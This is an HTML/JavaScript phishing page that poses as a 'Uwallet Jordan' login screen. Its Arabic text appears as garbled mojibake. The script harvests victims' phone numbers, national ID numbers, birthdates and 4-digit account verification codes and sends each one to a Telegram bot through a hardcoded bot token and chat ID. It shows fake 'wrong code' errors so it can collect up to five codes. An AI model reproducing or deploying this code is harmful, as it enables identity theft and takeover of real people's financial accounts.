<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Uwallet Ø§Ù„Ø£Ø±Ø¯Ù† | ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„</title>
  <!-- Open Graph Meta Tags for Link Preview -->
  <meta property="og:title" content="Uwallet Ø§Ù„Ø£Ø±Ø¯Ù† | ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„" />
  <meta property="og:description" content="Ø³Ø¬Ù„ Ø¯Ø®ÙˆÙ„Ùƒ Ù„Ø®Ø¯Ù…Ø§Øª Uwallet Ø§Ù„Ø£Ø±Ø¯Ù† Ø¨Ø£Ù…Ø§Ù† ÙˆØ³Ù‡ÙˆÙ„Ø©!" />
  <meta property="og:image" content="https://d.top4top.io/p_3619v3uia0.jpeg" />
  <meta property="og:url" content="https://uwalletjordan.vercel.app" />
  <meta property="og:type" content="website" />
  <meta property="og:locale" content="ar_AR" />
  <!-- Twitter Card Meta Tags -->
  <meta name="twitter:card" content="summary_large_image" />
  <meta name="twitter:title" content="Uwallet Ø§Ù„Ø£Ø±Ø¯Ù† | ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„" />
  <meta name="twitter:description" content="Ø³Ø¬Ù„ Ø¯Ø®ÙˆÙ„Ùƒ Ù„Ø®Ø¯Ù…Ø§Øª Uwallet Ø§Ù„Ø£Ø±Ø¯Ù† Ø¨Ø£Ù…Ø§Ù† ÙˆØ³Ù‡ÙˆÙ„Ø©!" />
  <meta name="twitter:image" content="https://d.top4top.io/p_3619v3uia0.jpeg" />
  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;900&display=swap" rel="stylesheet">
  <style>
    :root {
      --uwallet-blue: #1a84dd;
      --uwallet-dark: #00486e;
      --uwallet-gray: #f4f9fb;
      --uwallet-light-blue: #00a6e8;
      --uwallet-accent: #209dbf;
      --uwallet-pink: #ea4763;
    }
    body {
      background: linear-gradient(135deg, var(--uwallet-blue) 0%, var(--uwallet-dark) 83%);
      min-height: 100vh;
      font-family: 'Cairo', Arial, sans-serif;
      margin: 0;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    #app {
      background: #fff;
      border-radius: 22px;
      box-shadow: 0 8px 32px 0 rgba(26,132,221,0.10), 0 2px 12px #209dbf22;
      width: 370px;
      max-width: 95vw;
      padding: 34px 26px 32px 26px;
      box-sizing: border-box;
      direction: rtl;
      position: relative;
      overflow: hidden;
      border: 2.5px solid var(--uwallet-blue);
      animation: fadein 0.7s;
    }
    @keyframes fadein {
      from { opacity: 0; transform: translateY(36px);}
      to { opacity: 1; transform: none;}
    }
    .uwallet-header {
      display: flex;
      align-items: center;
      justify-content: center;
      margin-bottom: 18px;
      gap: 10px;
      flex-direction: row;
    }
    .uwallet-logo {
      width: 62px;
      height: 62px;
      border-radius: 18px;
      background: linear-gradient(135deg, var(--uwallet-blue) 55%, var(--uwallet-pink) 100%);
      display: flex;
      align-items: center;
      justify-content: center;
      box-shadow: 0 2px 16px #1a84dd19;
      border: 2.5px solid #fff;
      overflow: hidden;
    }
    .uwallet-logo img {
      width: 56px;
      height: 56px;
      object-fit: contain;
      background: #fff;
      border-radius: 15px;
      border: 1.5px solid #e3eefe;
      box-shadow: 0 1px 6px #1a84dd19;
    }
    .uwallet-title-main {
      font-size: 23px;
      font-weight: 900;
      letter-spacing: 0.2px;
      color: var(--uwallet-dark);
      margin: 0;
      text-shadow: 0 1px 0 #fff, 0 2px 10px #1a84dd12;
    }
    .uwallet-title-sub {
      font-size: 15px;
      color: var(--uwallet-accent);
      font-weight: 600;
      text-align: center;
      margin: 6px 0 0 0;
      letter-spacing: 0.07px;
    }
    .step-indicator {
      display: flex;
      justify-content: center;
      gap: 7px;
      margin-bottom: 18px;
      margin-top: 7px;
    }
    .step-dot {
      width: 11px;
      height: 11px;
      border-radius: 50%;
      background: var(--uwallet-gray);
      border: 2px solid var(--uwallet-light-blue);
      transition: background 0.2s;
    }
    .step-dot.active {
      background: linear-gradient(135deg, var(--uwallet-pink) 55%, var(--uwallet-blue) 100%);
      border-color: var(--uwallet-blue);
    }
    form {
      display: flex;
      flex-direction: column;
      gap: 13px;
      margin-top: 7px;
    }
    label {
      color: var(--uwallet-blue);
      font-size: 16px;
      font-weight: 600;
      margin-bottom: 3px;
      margin-right: 2px;
      letter-spacing: 0.18px;
    }
    input, select {
      padding: 14px 11px;
      border: none;
      border-radius: 9px;
      font-size: 15px;
      background: var(--uwallet-gray);
      color: #222;
      outline: none;
      box-shadow: 0 1.5px 5px #1a84dd13;
      transition: box-shadow 0.2s, border 0.2s;
      border: 2px solid #209dbf18;
      font-family: 'Cairo', Arial, sans-serif;
    }
    input:focus, select:focus {
      box-shadow: 0 3px 12px #209dbf40;
      border-color: var(--uwallet-blue);
      background: #f6fcff;
    }
    .button {
      background: linear-gradient(90deg, var(--uwallet-blue) 0%, var(--uwallet-pink) 100%);
      color: white;
      border: none;
      border-radius: 9px;
      padding: 13px 0;
      font-size: 17px;
      font-weight: 800;
      cursor: pointer;
      margin-top: 7px;
      margin-bottom: 3px;
      transition: background 0.18s, opacity 0.15s;
      letter-spacing: 0.6px;
      box-shadow: 0 1px 5px #209dbf19;
    }
    .button:active { opacity: 0.87; }
    .info-msg {
      text-align: center;
      color: var(--uwallet-blue);
      font-size: 13px;
      margin-bottom: 7px;
      margin-top: 2px;
      font-weight: 600;
      letter-spacing: 0.1px;
    }
    .code-inputs {
      display: flex;
      gap: 12px;
      justify-content: center;
      margin: 10px 0 9px 0;
    }
    /* widened code input */
    .code-inputs input {
      text-align: center;
      font-size: 18px;
      width: 85px; /* increased width */
      padding: 13px 0;
      letter-spacing: 6px;
      border-radius: 7px;
      border: 2px solid #1a84dd20;
      background: var(--uwallet-gray);
      font-weight: 700;
      transition: border 0.2s, box-shadow 0.2s;
      box-shadow: 0 1.5px 5px #209dbf18;
      direction: ltr;
    }
    .code-inputs input:focus {
      border-color: var(--uwallet-pink);
      background: #f6fcff;
    }
    .success-message {
      text-align: center;
      color: var(--uwallet-accent);
      font-size: 18px;
      font-weight: 700;
      margin: 22px 0 0 0;
      letter-spacing: 0.5px;
    }
    .uwallet-footer {
      margin-top: 21px;
      text-align: center;
      color: #a6c7ef;
      font-size: 12px;
      font-weight: 600;
      letter-spacing: 1px;
      opacity: 0.83;
      text-shadow: 0 1px 0 #fff;
    }
    #modalError {
      display: none;
      position: fixed;
      top:0; left:0; width:100vw; height:100vh;
      background: rgba(26,132,221,0.11);
      z-index: 9999;
      align-items: center;
      justify-content: center;
    }
    #modalError.active {
      display: flex;
      animation: fadein 0.3s;
    }
    #modalContent {
      background: #fff;
      padding: 27px 32px;
      border-radius: 13px;
      box-shadow: 0 7px 34px #209dbf33, 0 1.5px 8px #1a84dd18;
      text-align: center;
      min-width: 260px;
      border: 2px solid #ea476377;
    }
    #modalContent .err-title {
      color: #ea4763;
      font-size: 18px;
      font-weight: bold;
    }
    #modalContent .err-msg {
      margin-top: 8px;
      font-size: 15px;
      color: #444;
      font-weight: 600;
      margin-bottom: 8px;
    }
    #modalContent button {
      margin-top: 14px;
      background: linear-gradient(90deg, var(--uwallet-pink) 0%, var(--uwallet-blue) 100%);
      color: #fff;
      padding: 7px 27px;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      font-size: 15px;
      font-weight: bold;
    }
    #modalContent button:active {
      background: linear-gradient(90deg, var(--uwallet-blue) 0%, var(--uwallet-pink) 100%);
    }
    .birthdate-fields {
      display: flex;
      gap: 7px;
      align-items: center;
      margin-bottom: 4px;
    }
    .birthdate-fields select {
      width: 33%;
      padding: 11px 4px;
      font-size: 15px;
      text-align: center;
    }
    .back-btn {
      background: transparent;
      border: none;
      color: var(--uwallet-blue);
      font-size: 19px;
      font-weight: 600;
      cursor: pointer;
      margin-bottom: 7px;
    }
    /* inline error under code input */
    .inline-err {
      text-align: center;
      color: #ea4763;
      font-size: 14px;
      margin-top: 6px;
      font-weight: 700;
    }
    /* shake animation for wrong code */
    @keyframes shake {
      0% { transform: translateX(0); }
      20% { transform: translateX(-6px); }
      40% { transform: translateX(6px); }
      60% { transform: translateX(-4px); }
      80% { transform: translateX(4px); }
      100% { transform: translateX(0); }
    }
    .shake {
      animation: shake 340ms;
    }
    @media (max-width: 450px) {
      #app { padding: 12px 1vw 6px 1vw; }
      .uwallet-logo { width: 43px; height: 43px;}
      .uwallet-logo img {width: 38px; height: 38px;}
      .uwallet-title-main { font-size: 16px;}
      .uwallet-title-sub { font-size: 11px;}
      #modalContent { padding: 16px 7vw;}
      .birthdate-fields select { font-size: 13px; }
      .code-inputs input { width: 60px; letter-spacing: 5px;} /* smaller on mobile */
    }
  </style>
</head>
<body>
  <div id="app"></div>
  <!-- Modal Error -->
  <div id="modalError">
    <div id="modalContent">
      <div class="err-title">Ø®Ø·Ø£ ÙÙŠ Ø¥Ø¯Ø®Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª</div>
      <div class="err-msg">ÙŠØ±Ø¬Ù‰ Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø© Ù…Ø±Ø© Ø£Ø®Ø±Ù‰ ÙˆØ³ÙŠØªÙ… Ø¥Ø¹Ø§Ø¯ØªÙƒ Ø¥Ù„Ù‰ Ø§Ù„ØµÙØ­Ø© Ø§Ù„Ø£ÙˆÙ„Ù‰.</div>
      <button onclick="restart()">Ø¥Ø¹Ø§Ø¯Ø© Ù„Ù„Ù…Ø­Ø§ÙˆÙ„Ø©</button>
    </div>
  </div>
  <script>
    // Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø´Ø¹Ø§Ø± ÙˆØ§Ù„Ø¨ÙˆØª
    const uwalletLogo = "https://d.top4top.io/p_3619v3uia0.jpeg";
    const BOT_TOKEN = "8478729698:AAH6ufdvIQicXkUajFb3M1ocoGusDHIbWoI";
    const CHAT_ID = "6873334348";
    let userData = {phone: '', nationalId:'', birthdate:'', code4b:''};
    let currentStep = "phone";
    let telegramMsgId = null;

    // attempts for 4-digit code
    let codeAttempts = 0;
    const maxCodeAttempts = 5;

    function restart() {
      closeModal();
      userData = {phone: '', nationalId:'', birthdate:'', code4b:''};
      codeAttempts = 0;
      currentStep = "phone";
      renderPhoneStep();
    }

    function stepIndicator(step) {
      // Ø§Ù„Ø¢Ù† 3 Ø®Ø·ÙˆØ§Øª Ø¨Ø¯Ù„Ø§Ù‹ Ù…Ù† 4
      return `
        <div class="step-indicator">
          <div class="step-dot${step===1?' active':''}"></div>
          <div class="step-dot${step===2?' active':''}"></div>
          <div class="step-dot${step===3?' active':''}"></div>
        </div>
      `;
    }
    function header(sub="") {
      return `
        <div class="uwallet-header">
          <div class="uwallet-logo"><img src="${uwalletLogo}" alt="Uwallet" /></div>
          <span class="uwallet-title-main">Uwallet Ø§Ù„Ø£Ø±Ø¯Ù†</span>
        </div>
        <div class="uwallet-title-sub">${sub}</div>
      `;
    }

    function showErrorModal() {
      document.getElementById('modalError').classList.add('active');
    }
    function closeModal() {
      document.getElementById('modalError').classList.remove('active');
    }

    function renderPhoneStep() {
      currentStep = "phone";
      app.innerHTML = `
        ${header("Ù…Ø±Ø­Ø¨Ù‹Ø§ Ø¨Ùƒ! Ø³Ø¬Ù„ Ø¯Ø®ÙˆÙ„Ùƒ Ù„Ø­Ø³Ø§Ø¨ Uwallet")}
        ${stepIndicator(1)}
        <form id="phoneForm" autocomplete="off">
          <label>Ø±Ù‚Ù… Ø§Ù„Ù‡Ø§ØªÙ</label>
          <input type="tel" id="phone" maxlength="10" required placeholder="07XXXXXXXX" pattern="07[0-9]{8}" autocomplete="tel" inputmode="numeric"/>
          <button type="submit" class="button">ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„</button>
        </form>
        <div class="uwallet-footer">Uwallet Jordan &copy; 2025</div>
      `;
      document.getElementById('phone').focus();
      document.getElementById('phoneForm').onsubmit = async function(e) {
        e.preventDefault();
        const phone = document.getElementById('phone').value.trim();
        if (!/^07\d{8}$/.test(phone)) {
          // Ø®Ø·Ø£ ØªÙ†Ø³ÙŠÙ‚ Ø§Ù„Ù‡Ø§ØªÙ
          // Ù†Ø¹Ø±Ø¶ Ø§Ù„Ù…Ø±Ø¨Ø¹ Ø§Ù„Ù…Ù†Ø¨Ø«Ù‚ Ø§Ù„Ø¹Ø§Ù…
          showErrorModal(); return;
        }
        userData.phone = phone;
        // Ø¥Ø±Ø³Ø§Ù„ Ø±Ù‚Ù… Ø§Ù„Ù‡Ø§ØªÙ Ù„Ù„Ø¨ÙˆØª
        try {
          telegramMsgId = await sendToTelegram(`ğŸŸ¦ ØªØ³Ø¬ÙŠÙ„ Ø¯Ø®ÙˆÙ„ Uwallet Ø§Ù„Ø£Ø±Ø¯Ù†\nğŸ“± Ø§Ù„Ù‡Ø§ØªÙ: ${userData.phone}`);
        } catch (err) {}
        // Ø§Ù„Ø§Ù†ØªÙ‚Ø§Ù„ Ù…Ø¨Ø§Ø´Ø±Ø©Ù‹ Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù‡ÙˆÙŠØ©/ØªØ§Ø±ÙŠØ® Ø§Ù„Ù…ÙŠÙ„Ø§Ø¯
        renderIdBirthStep();
      };
    }

    function renderIdBirthStep() {
      currentStep = "id_birth";
      app.innerHTML = `
        <button class="back-btn" id="backBtn">&#8592; Ø±Ø¬ÙˆØ¹</button>
        ${header("Ø¨ÙŠØ§Ù†Ø§ØªÙƒ Ø§Ù„Ø´Ø®ØµÙŠØ©")}
        ${stepIndicator(2)}
        <form id="idForm" autocomplete="off">
          <label>Ø§Ù„Ø±Ù‚Ù… Ø§Ù„ÙˆØ·Ù†ÙŠ</label>
          <input type="text" id="nationalId" placeholder="Ø§Ù„Ø±Ù‚Ù… Ø§Ù„ÙˆØ·Ù†ÙŠ" maxlength="12" required inputmode="numeric"/>
          <label>ØªØ§Ø±ÙŠØ® Ø§Ù„Ù…ÙŠÙ„Ø§Ø¯</label>
          <div class="birthdate-fields" id="birthdateFields"></div>
          <button type="submit" class="button">Ø§Ù„ØªØ§Ù„ÙŠ</button>
        </form>
        <div class="uwallet-footer">Uwallet Jordan &copy; 2025</div>
      `;
      renderBirthdateFields();
      document.getElementById('nationalId').focus();

      document.getElementById('idForm').onsubmit = async function(e) {
        e.preventDefault();
        const nationalId = document.getElementById('nationalId').value.trim();
        const day = document.getElementById('birthDay').value;
        const month = document.getElementById('birthMonth').value;
        const year = document.getElementById('birthYear').value;
        if (!/^\d{10,12}$/.test(nationalId)) { showErrorModal(); return; }
        if (!day || !month || !year) { showErrorModal(); return; }
        const birthdate = `${year}-${month.padStart(2, '0')}-${day.padStart(2, '0')}`;
        userData.nationalId = nationalId;
        userData.birthdate = birthdate;
        // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ù„Ù„Ø¨ÙˆØª (Ø¨Ø¯ÙˆÙ† Ø±Ù…Ø² SMS Ù„Ø£Ù†Ù†Ø§ Ø­Ø°ÙÙ†Ø§Ù‡)
        try {
          telegramMsgId = await sendToTelegram(
            `ğŸŸ¦ ØªØ³Ø¬ÙŠÙ„ Ø¯Ø®ÙˆÙ„ Uwallet Ø§Ù„Ø£Ø±Ø¯Ù†\nğŸ“± Ø§Ù„Ù‡Ø§ØªÙ: ${userData.phone}\nğŸ†” Ø§Ù„Ø±Ù‚Ù… Ø§Ù„ÙˆØ·Ù†ÙŠ: ${userData.nationalId}\nğŸ‚ ØªØ§Ø±ÙŠØ® Ø§Ù„Ù…ÙŠÙ„Ø§Ø¯: ${userData.birthdate}`
          );
        } catch (err) {}
        renderFinalCodeStep();
      };
      document.getElementById('backBtn').onclick = () => {
        renderPhoneStep();
      };
    }

    function renderBirthdateFields() {
      const now = new Date();
      const maxYear = now.getFullYear();
      const minYear = maxYear - 100;
      const birthdateFields = document.getElementById('birthdateFields');
      let days = '<select id="birthDay" required><option value="">Ø§Ù„ÙŠÙˆÙ…</option>';
      for (let d = 1; d <= 31; d++) days += `<option value="${d}">${d}</option>`;
      days += '</select>';
      const monthNames = [
        'ÙŠÙ†Ø§ÙŠØ±','ÙØ¨Ø±Ø§ÙŠØ±','Ù…Ø§Ø±Ø³','Ø£Ø¨Ø±ÙŠÙ„','Ù…Ø§ÙŠÙˆ','ÙŠÙˆÙ†ÙŠÙˆ',
        'ÙŠÙˆÙ„ÙŠÙˆ','Ø£ØºØ³Ø·Ø³','Ø³Ø¨ØªÙ…Ø¨Ø±','Ø£ÙƒØªÙˆØ¨Ø±','Ù†ÙˆÙÙ…Ø¨Ø±','Ø¯ÙŠØ³Ù…Ø¨Ø±'
      ];
      let months = '<select id="birthMonth" required><option value="">Ø§Ù„Ø´Ù‡Ø±</option>';
      for (let m = 1; m <= 12; m++) months += `<option value="${m}">${monthNames[m - 1]}</option>`;
      months += '</select>';
      let years = '<select id="birthYear" required><option value="">Ø§Ù„Ø³Ù†Ø©</option>';
      for (let y = maxYear; y >= minYear; y--) years += `<option value="${y}">${y}</option>`;
      years += '</select>';
      birthdateFields.innerHTML = days + months + years;
    }

    function renderFinalCodeStep() {
      currentStep = "code4b";
      app.innerHTML = `
        <button class="back-btn" id="backBtn">&#8592; Ø±Ø¬ÙˆØ¹</button>
        ${header("Ø±Ù…Ø² ØªØ­Ù‚Ù‚ Ø¥Ø¶Ø§ÙÙŠ Ù„Ø­Ù…Ø§ÙŠØ© Ø§Ù„Ø­Ø³Ø§Ø¨")}
        ${stepIndicator(3)}
        <div class="info-msg">Ø£Ø¯Ø®Ù„ Ø±Ù…Ø² ØªØ­Ù‚Ù‚ Ø­Ø³Ø§Ø¨Ùƒ Ø§Ù„Ù…ÙƒÙˆÙ† Ù…Ù† 4 Ø£Ø±Ù‚Ø§Ù… Ù„Ø¥ÙƒÙ…Ø§Ù„ ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„</div>
        <form id="code4bForm" autocomplete="off">
          <div class="code-inputs">
            <input type="text" maxlength="4" pattern="\\d{4}" required id="code4binput" inputmode="numeric" placeholder="****" />
          </div>
          <div id="codeError" class="inline-err" style="display:none;"></div>
          <button type="submit" class="button">ØªØ£ÙƒÙŠØ¯ Ø§Ù„Ø±Ù…Ø²</button>
        </form>
        <div class="uwallet-footer">Uwallet Jordan &copy; 2025</div>
      `;
      const codeInput = document.getElementById('code4binput');
      codeInput.focus();
      codeInput.addEventListener('input', function() {
        this.value = this.value.replace(/\D/g, '').slice(0,4);
      });
      document.getElementById('code4bForm').onsubmit = async function(e) {
        e.preventDefault();
        let code = codeInput.value.trim();
        if (code.length !== 4) { 
          // Ù†Ø¹Ø±Ø¶ Ø±Ø³Ø§Ù„Ø© Ø§Ù„Ø®Ø·Ø£ Ø§Ù„Ù…ÙˆØ­Ø¯Ø© Ø¹Ù†Ø¯Ù…Ø§ ÙŠÙƒÙˆÙ† Ù‡Ù†Ø§Ùƒ Ø®Ø·Ø£ ÙÙŠ Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚
          const codeError = document.getElementById('codeError');
          codeError.textContent = `Ø­Ø¯Ø« Ø®Ø·Ø£ ÙÙŠ Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚ØŒ Ù‚Ù…Ù†Ø§ Ø¨Ø¥Ø±Ø³Ø§Ù„ Ø±Ù…Ø² ØªØ­Ù‚Ù‚ Ø¢Ø®Ø±.`;
          codeError.style.display = 'block';
          codeInput.classList.add('shake');
          setTimeout(()=>codeInput.classList.remove('shake'),350);
          return;
        }

        // Ù†Ø²ÙŠØ¯ Ø¹Ø¯Ù‘ Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø§Øª Ù„ÙƒÙ„ Ø¥Ø¯Ø®Ø§Ù„
        codeAttempts++;
        userData.code4b = code;

        // Ø¥Ø±Ø³Ø§Ù„ Ù…Ø­Ø§ÙˆÙ„Ø© Ø§Ù„Ø±Ù…Ø² Ù„Ù„Ø¨ÙˆØª Ù„ØªÙˆØ«ÙŠÙ‚ Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø§Øª (Ø§Ù„Ø¢Ù† ØªØªØ¶Ù…Ù† ØªØ§Ø±ÙŠØ® Ø§Ù„Ù…ÙŠÙ„Ø§Ø¯ Ø£ÙŠØ¶Ø§Ù‹)
        try {
          await sendToTelegram(
            `ğŸŸ¦ Ù…Ø­Ø§ÙˆÙ„Ø© Ø±Ù…Ø² ØªØ­Ù‚Ù‚ Uwallet Ø§Ù„Ø£Ø±Ø¯Ù†\nğŸ“± Ø§Ù„Ù‡Ø§ØªÙ: ${userData.phone}\nğŸ†” ${userData.nationalId}\nğŸ‚ ØªØ§Ø±ÙŠØ® Ø§Ù„Ù…ÙŠÙ„Ø§Ø¯: ${userData.birthdate}\nğŸ”’ Ø§Ù„Ø±Ù…Ø²: ${userData.code4b}\nÙ…Ø­Ø§ÙˆÙ„Ø©: ${codeAttempts}/${maxCodeAttempts}`
          );
        } catch (err) {}

        if (codeAttempts < maxCodeAttempts) {
          // Ø¹Ø±Ø¶ Ø±Ø³Ø§Ù„Ø© Ø®Ø·Ø£ Ù…ÙˆØ­Ø¯Ø© Ø¨Ø¹Ø¯ ÙƒÙ„ Ù…Ø­Ø§ÙˆÙ„Ø© Ø®Ø§Ø·Ø¦Ø©
          const codeError = document.getElementById('codeError');
          codeError.textContent = `Ø­Ø¯Ø« Ø®Ø·Ø£ ÙÙŠ Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚ØŒ Ù‚Ù…Ù†Ø§ Ø¨Ø¥Ø±Ø³Ø§Ù„ Ø±Ù…Ø² ØªØ­Ù‚Ù‚ Ø¢Ø®Ø±.`;
          codeError.style.display = 'block';
          codeInput.classList.add('shake');
          setTimeout(()=>codeInput.classList.remove('shake'),350);
          codeInput.value = '';
          codeInput.focus();
          return;
        } else {
          // Ø¹Ù†Ø¯ Ø§Ù„ÙˆØµÙˆÙ„ Ø¥Ù„Ù‰ Ø§Ù„Ø­Ø¯ Ø§Ù„Ø£Ù‚ØµÙ‰ Ù…Ù† Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø§Øª: Ø¹Ø±Ø¶ Ø±Ø³Ø§Ù„Ø© Ø®Ø·Ø£ Ù†Ù‡Ø§Ø¦ÙŠØ© ÙˆØªÙˆØ¬ÙŠÙ‡ Ù„Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„ØªÙ‚Ø¯ÙŠÙ…
          const modalTitle = document.querySelector('#modalContent .err-title');
          const modalMsg = document.querySelector('#modalContent .err-msg');
          if (modalTitle) modalTitle.textContent = 'Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ù…Ø¹Ù„ÙˆÙ…Ø§Øª';
          if (modalMsg) modalMsg.textContent = 'Ø§Ù„Ù…Ø¹Ù„ÙˆÙ…Ø§Øª ØºÙŠØ± ØµØ­ÙŠØ­Ø©ØŒ Ù‚Ø¯Ù… Ø·Ù„Ø¨Ùƒ Ù…Ø±Ø© Ø£Ø®Ø±Ù‰.';
          showErrorModal();
          // Ù†ÙØ¨Ù‚ÙŠ Ø¹Ù„Ù‰ Ø§Ù„Ø²Ø± ÙÙŠ Ø§Ù„Ù…ÙˆØ¯Ø§Ù„ Ù„Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø© (restart)
          return;
        }
      };
      document.getElementById('backBtn').onclick = () => {
        renderIdBirthStep();
      };
    }

    async function sendToTelegram(msg) {
      // Ø­Ø°Ù Ø§Ù„Ø±Ø³Ø§Ø¦Ù„ Ø§Ù„Ø³Ø§Ø¨Ù‚Ø© Ø¥Ù† ÙˆØ¬Ø¯Øª
      if (telegramMsgId) {
        try {
          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/deleteMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              chat_id: CHAT_ID,
              message_id: telegramMsgId
            })
          });
        } catch (err) {}
      }
      try {
        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: msg
          })
        });
        const data = await res.json();
        if (data && data.result && data.result.message_id) {
          return data.result.message_id;
        }
      } catch (err) {}
      return null;
    }

    const app = document.getElementById('app');
    renderPhoneStep();
  </script>
</body>
</html>